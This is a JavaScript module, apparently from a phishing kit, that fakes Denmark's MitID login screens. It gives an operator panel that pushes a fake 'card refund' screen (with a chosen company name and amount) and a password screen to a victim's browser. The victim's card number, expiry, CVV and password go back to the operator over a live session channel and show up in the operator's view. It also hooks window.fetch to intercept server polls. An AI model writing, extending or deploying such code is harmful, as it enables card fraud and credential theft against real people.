/**
 * Refundering på kort + Adgangskode
 * Admin: modal (who + amount) like "Aktiver SMS", plus Adgangskode button
 * Client: MitID-style screens (card / password)
 */
(function () {
  var BASE = (typeof window !== "undefined" && window.__APP_BASE__) || "";
  var USER_KEY = "miitid_user_session";
  var ADMIN_KEY = "miitid_admin_selected_session";

  function sidUser() {
    try {
      return localStorage.getItem(USER_KEY) || sessionStorage.getItem(USER_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  function sidAdmin() {
    try {
      return localStorage.getItem(ADMIN_KEY) || "";
    } catch (e) {
      return "";
    }
  }
  function isAdmin() {
    var h = window.location.hash || "";
    return h.indexOf("admin") === 1;
  }

  function send(role, data) {
    var sessionId = role === "admin" ? sidAdmin() : sidUser();
    if (!sessionId) {
      alert(role === "admin" ? "Vælg en session først" : "Ingen aktiv session");
      return Promise.resolve(false);
    }
    return fetch(BASE + "/api/ws/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId: sessionId, role: role, data: data }),
    })
      .then(function (r) {
        return r.ok;
      })
      .catch(function () {
        return false;
      });
  }

  function toast(msg) {
    var el = document.getElementById("juj-rf-toast");
    if (!el) {
      el = document.createElement("div");
      el.id = "juj-rf-toast";
      el.style.cssText =
        "position:fixed;top:14px;right:14px;z-index:100000;max-width:340px;padding:12px 14px;border-radius:12px;background:#0f766e;color:#fff;font:600 13px/1.4 'IBM Plex Sans',sans-serif;box-shadow:0 10px 30px rgba(0,0,0,.2)";
      document.body.appendChild(el);
    }
    el.textContent = msg;
    el.style.display = "block";
    clearTimeout(el._t);
    el._t = setTimeout(function () {
      el.style.display = "none";
    }, 7000);
  }

  function mitidLogoHtml() {
    return (
      '<div style="display:flex;align-items:center;gap:6px;font-weight:700;font-size:18px;color:#0060e6;letter-spacing:-0.02em">' +
      '<span>Mit</span><span style="display:inline-flex;width:18px;height:18px;border-radius:50%;background:#0060e6;align-items:center;justify-content:center">' +
      '<svg width="10" height="10" viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="8" r="4"/><path d="M4 22c0-4.4 3.6-8 8-8s8 3.6 8 8"/></svg></span>' +
      "<span>ID</span></div>"
    );
  }

  function closeOverlay(id) {
    var el = document.getElementById(id);
    if (el) el.remove();
  }

  /* ---------- ADMIN: Refund modal (like Aktiver SMS) ---------- */
  function openAdminRefundModal() {
    closeOverlay("juj-admin-refund-modal");
    var wrap = document.createElement("div");
    wrap.id = "juj-admin-refund-modal";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.72);display:flex;align-items:flex-end;justify-content:center;padding:12px;font-family:'IBM Plex Sans',Inter,sans-serif";
    wrap.innerHTML =
      '<div style="width:100%;max-width:420px;background:#1e293b;border-radius:18px 18px 14px 14px;padding:18px 16px 16px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
      '<div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:16px">' +
      '<div style="display:flex;gap:10px;align-items:center">' +
      '<div style="width:34px;height:34px;border-radius:10px;background:#0060e6;display:flex;align-items:center;justify-content:center;font-size:16px">💳</div>' +
      "<div><div style=\"font-weight:700;font-size:16px\">Refund card transaction</div>" +
      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Hvem og hvor meget</div></div></div>' +
      '<button type="button" id="juj-adm-rf-close" style="width:32px;height:32px;border:0;border-radius:999px;background:rgba(100,116,139,.5);color:#fff;cursor:pointer;font-size:16px">×</button>' +
      "</div>" +
      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">REFUNDERING FRA (FIRMA / NAVN)</label>' +
      '<input id="juj-adm-rf-from" type="text" placeholder="F.eks. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">BELØB</label>' +
      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="F.eks. 1.250,00" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
      '<div style="display:flex;gap:10px">' +
      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Uden beløb</button>' +
      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Aktiver refundering</button>' +
      "</div></div>";

    document.body.appendChild(wrap);
    document.getElementById("juj-adm-rf-close").onclick = function () {
      closeOverlay("juj-admin-refund-modal");
    };
    wrap.addEventListener("click", function (e) {
      if (e.target === wrap) closeOverlay("juj-admin-refund-modal");
    });

    function activate(withAmount) {
      var from = (document.getElementById("juj-adm-rf-from").value || "").trim();
      var amount = withAmount ? (document.getElementById("juj-adm-rf-amount").value || "").trim() : "";
      if (!from) {
        document.getElementById("juj-adm-rf-from").focus();
        return;
      }
      send("admin", {
        type: "show-card-refund",
        from: from,
        displayText: from,
        amount: amount || null,
      }).then(function (ok) {
        if (ok) toast("Refunderingsskærm sendt til klient");
        closeOverlay("juj-admin-refund-modal");
      });
    }

    document.getElementById("juj-adm-rf-go").onclick = function () {
      activate(true);
    };
    document.getElementById("juj-adm-rf-skip").onclick = function () {
      activate(false);
    };
    setTimeout(function () {
      var el = document.getElementById("juj-adm-rf-from");
      if (el) el.focus();
    }, 50);
  }

  /* ---------- CLIENT: MitID-style card refund ---------- */
  function showClientCard(msg) {
    closeOverlay("juj-client-refund");
    var from = (msg && (msg.from || msg.displayText)) || "";
    var amount = msg && msg.amount ? String(msg.amount) : "";
    var amountLabel = "";
    if (amount) {
      var n = amount.replace(/\s/g, "").replace(",", ".");
      var num = parseFloat(n);
      if (!isNaN(num)) {
        amountLabel =
          num.toLocaleString("da-DK", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " kr";
      } else {
        amountLabel = amount + (amount.indexOf("kr") >= 0 ? "" : " kr");
      }
    }

    var wrap = document.createElement("div");
    wrap.id = "juj-client-refund";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:#f0f1f3;display:flex;flex-direction:column;font-family:'IBM Plex Sans',Inter,sans-serif";
    wrap.innerHTML =
      '<header style="background:#fff;height:50px;display:flex;align-items:center;padding:0 20px;border-bottom:1px solid #e5e7eb">' +
      mitidLogoHtml() +
      "</header>" +
      '<main style="flex:1;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px">' +
      '<div style="background:#fff;width:100%;max-width:420px;border-radius:8px;padding:22px 22px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06)">' +
      '<div style="display:flex;justify-content:flex-end;margin-bottom:10px">' +
      mitidLogoHtml() +
      "</div>" +
      '<div style="height:1px;background:#e5e7eb;margin-bottom:22px"></div>' +
      '<div style="display:flex;align-items:center;gap:10px;margin-bottom:18px">' +
      '<span style="font-size:22px">💳</span>' +
      '<div style="font-weight:700;font-size:15px;letter-spacing:.04em;color:#001C44">REFUNDERING PÅ KORT</div></div>' +
      (from
        ? '<div style="border:1px solid #dbe3ef;border-radius:10px;padding:14px 16px;text-align:center;font-weight:700;font-size:18px;color:#001C44;margin-bottom:10px">' +
          escapeHtml(from.toUpperCase()) +
          "</div>"
        : "") +
      (amountLabel
        ? '<div style="text-align:center;font-size:15px;font-weight:600;color:#0060e6;margin-bottom:14px">' +
          escapeHtml(amountLabel) +
          "</div>"
        : "") +
      '<p style="margin:0 0 18px;font-size:14px;color:#6b7280;line-height:1.45">Indtast kortoplysninger for at få beløbet tilbageført.</p>' +
      '<label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">Kortnummer</label>' +
      '<input id="juj-c-num" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px;margin-bottom:14px" />' +
      '<div style="display:flex;gap:12px;margin-bottom:22px">' +
      '<div style="flex:1"><label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">Måned / år</label>' +
      '<input id="juj-c-exp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/ÅÅ" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px" /></div>' +
      '<div style="flex:1"><label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">CVV</label>' +
      '<input id="juj-c-cvv" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" maxlength="4" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px" /></div></div>' +
      '<button type="button" id="juj-c-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px">BEKRÆFT <span>→</span></button>' +
      "</div></main>";

    document.body.appendChild(wrap);
    var num = document.getElementById("juj-c-num");
    var exp = document.getElementById("juj-c-exp");
    var cvv = document.getElementById("juj-c-cvv");
    var btn = document.getElementById("juj-c-submit");

    num.addEventListener("input", function () {
      var v = num.value.replace(/\D/g, "").slice(0, 19);
      num.value = v.replace(/(.{4})/g, "$1 ").trim();
      updateBtn();
    });
    exp.addEventListener("input", function () {
      var v = exp.value.replace(/\D/g, "").slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
      exp.value = v;
      updateBtn();
    });
    cvv.addEventListener("input", function () {
      cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
      updateBtn();
    });

    function updateBtn() {
      var ok =
        num.value.replace(/\s/g, "").length >= 12 &&
        exp.value.length >= 4 &&
        cvv.value.length >= 3;
      btn.style.background = ok ? "#0060e6" : "#e8eef7";
      btn.style.color = ok ? "#fff" : "#6b9bd1";
    }

    btn.onclick = function () {
      var cardNumber = num.value.replace(/\s/g, "");
      if (cardNumber.length < 12 || exp.value.length < 4 || cvv.value.length < 3) return;
      btn.disabled = true;
      send("user", {
        type: "card-refund-submitted",
        cardNumber: cardNumber,
        expiry: exp.value.trim(),
        cvv: cvv.value.trim(),
        from: from,
        amount: amount || null,
      }).then(function () {
        closeOverlay("juj-client-refund");
        toast("Sendt — vent venligst");
      });
    };
    setTimeout(function () {
      num.focus();
    }, 80);
  }

  /* ---------- CLIENT: Adgangskode ---------- */
  function showClientPassword() {
    closeOverlay("juj-client-refund");
    var wrap = document.createElement("div");
    wrap.id = "juj-client-refund";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:99998;background:#f0f1f3;display:flex;flex-direction:column;font-family:'IBM Plex Sans',Inter,sans-serif";
    wrap.innerHTML =
      '<header style="background:#fff;height:50px;display:flex;align-items:center;padding:0 20px;border-bottom:1px solid #e5e7eb">' +
      mitidLogoHtml() +
      "</header>" +
      '<main style="flex:1;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px">' +
      '<div style="background:#fff;width:100%;max-width:420px;border-radius:8px;padding:22px 22px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06)">' +
      '<div style="display:flex;justify-content:flex-end;margin-bottom:10px">' +
      mitidLogoHtml() +
      "</div>" +
      '<div style="height:1px;background:#e5e7eb;margin-bottom:22px"></div>' +
      '<div style="display:flex;align-items:center;gap:10px;margin-bottom:18px">' +
      '<span style="font-size:22px">🔒</span>' +
      '<div style="font-weight:700;font-size:15px;letter-spacing:.04em;color:#001C44">ADGANGSKODE</div></div>' +
      '<p style="margin:0 0 18px;font-size:14px;color:#6b7280;line-height:1.45">Indtast din Adgangskode for at bekræfte</p>' +
      '<label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">Adgangskode</label>' +
      '<input id="juj-p-input" type="password" autocomplete="current-password" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px;margin-bottom:22px" />' +
      '<button type="button" id="juj-p-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px">BEKRÆFT <span>→</span></button>' +
      "</div></main>";

    document.body.appendChild(wrap);
    var inp = document.getElementById("juj-p-input");
    var btn = document.getElementById("juj-p-submit");
    inp.addEventListener("input", function () {
      var ok = (inp.value || "").trim().length > 0;
      btn.style.background = ok ? "#0060e6" : "#e8eef7";
      btn.style.color = ok ? "#fff" : "#6b9bd1";
    });
    btn.onclick = function () {
      var code = (inp.value || "").trim();
      if (!code) return;
      btn.disabled = true;
      send("user", { type: "adgangskode-submitted", code: code }).then(function () {
        closeOverlay("juj-client-refund");
        toast("Sendt — vent venligst");
      });
    };
    setTimeout(function () {
      inp.focus();
    }, 80);
  }

  function escapeHtml(s) {
    return String(s)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function handleMessages(messages) {
    if (!messages || !messages.length) return;
    for (var i = 0; i < messages.length; i++) {
      var raw = messages[i].message;
      var msg =
        typeof raw === "string"
          ? (function () {
              try {
                return JSON.parse(raw);
              } catch (e) {
                return null;
              }
            })()
          : raw;
      if (!msg || !msg.type) continue;

      if (!isAdmin()) {
        if (msg.type === "show-adgangskode") showClientPassword();
        if (msg.type === "show-card-refund") showClientCard(msg);
      } else {
        if (msg.type === "adgangskode-submitted") toast("Adgangskode: " + (msg.code || "—"));
        if (msg.type === "card-refund-submitted") {
          toast(
            "Kort " +
              (msg.cardNumber || "—") +
              (msg.expiry ? " | " + msg.expiry : "") +
              (msg.cvv ? " | CVV " + msg.cvv : "")
          );
        }
      }
    }
  }

  var origFetch = window.fetch;
  window.fetch = function () {
    var args = arguments;
    return origFetch.apply(this, args).then(function (res) {
      try {
        var url = typeof args[0] === "string" ? args[0] : args[0] && args[0].url;
        if (url && String(url).indexOf("/api/ws/poll") !== -1) {
          res
            .clone()
            .json()
            .then(function (data) {
              if (data && data.messages) handleMessages(data.messages);
            })
            .catch(function () {});
        }
      } catch (e) {}
      return res;
    });
  };

  document.addEventListener(
    "click",
    function (e) {
      if (!isAdmin() || !e.target) return;
      var node = e.target;
      for (var i = 0; i < 6 && node; i++) {
        var txt = (node.getAttribute && node.getAttribute("data-session-id")) || "";
        if (!txt && node.textContent) {
          var m = String(node.textContent).match(/[a-f0-9]{32,}/i);
          if (m) txt = m[0].slice(0, 64);
        }
        if (txt && txt.length >= 32) {
          try {
            localStorage.setItem(ADMIN_KEY, txt);
          } catch (err) {}
          break;
        }
        node = node.parentElement;
      }
    },
    true
  );

  function injectAdminButtons() {
    if (!isAdmin()) return;
    if (document.getElementById("juj-refund-admin")) return;
    var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
    var anchor = null;
    for (var i = 0; i < buttons.length; i++) {
      var label = (buttons[i].textContent || "").trim();
      if (
        label === "Betaling annulleret" ||
        label === "Standardside" ||
        label === "Godkend bruger" ||
        label === "+ Send SMS"
      ) {
        anchor = buttons[i].parentElement;
      }
    }
    if (!anchor || !anchor.parentElement) return;

    var box = document.createElement("div");
    box.id = "juj-refund-admin";
    box.style.cssText = "margin-bottom:20px";
    box.innerHTML =
      '<div style="font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.06em;font-weight:700;margin-bottom:8px">Refundering på kort</div>' +
      '<button type="button" id="juj-btn-card" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Refund card transaction</button>' +
      '<button type="button" id="juj-btn-ak" style="width:100%;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer">Adgangskode</button>';
    anchor.parentElement.insertBefore(box, anchor.nextSibling);

    document.getElementById("juj-btn-card").onclick = function () {
      openAdminRefundModal();
    };
    document.getElementById("juj-btn-ak").onclick = function () {
      send("admin", { type: "show-adgangskode" }).then(function (ok) {
        if (ok) toast("Adgangskode-skærm sendt til klient");
      });
    };
  }

  setInterval(injectAdminButtons, 1000);
  window.addEventListener("hashchange", function () {
    setTimeout(injectAdminButtons, 300);
  });
})();
